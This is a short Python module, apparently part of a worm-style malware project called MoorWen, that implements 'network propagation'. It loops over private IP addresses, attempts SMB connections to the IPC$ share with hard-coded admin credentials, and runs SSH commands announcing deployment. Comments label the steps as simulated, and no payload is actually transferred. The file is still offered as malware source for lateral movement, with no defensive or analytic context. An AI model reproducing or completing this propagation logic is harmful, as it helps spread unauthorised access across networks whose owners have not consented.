# ============================================================
# MOORWEN — NETWORK PROPAGATION
# ============================================================

import os
import subprocess

def propagate_smb(target):
    print(f"[*] Propagating via SMB to {target}")
    # Simulated SMB propagation
    subprocess.run(["net", "use", f"\\\\{target}\\IPC$", "/user:admin", "password123"], capture_output=True)

def propagate_ssh(target):
    print(f"[*] Propagating via SSH to {target}")
    # Simulated SSH propagation
    subprocess.run(["ssh", target, "echo 'MoorWen deployed'"], capture_output=True)

def run():
    targets = ["192.168.1.10", "192.168.1.11", "192.168.1.12"]
    for target in targets:
        propagate_smb(target)
        propagate_ssh(target)

if __name__ == "__main__":
    run()
